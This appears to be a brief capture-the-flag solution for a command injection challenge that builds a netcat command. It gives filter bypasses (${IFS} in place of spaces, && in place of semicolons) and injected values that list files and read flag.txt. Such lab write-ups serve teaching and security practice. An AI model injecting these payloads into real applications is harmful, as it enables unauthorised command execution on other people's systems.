# solution
- find command called in source code: `nc -zv <url> 80 2>&1`
- injection
  - close nc command properly -> add `80`
  - at the end, add a command to handle the `80 2>&1` added by the script -> e.g. echo
- bypass filters
  - space is blocked -> use ${IFS}
  - ; is blocked -> use &&
- set value in option to:
  - `twitter.com${IFS}80&&ls&&echo`
  - `twitter.com${IFS}80&&cat${IFS}flag.txt&&echo`
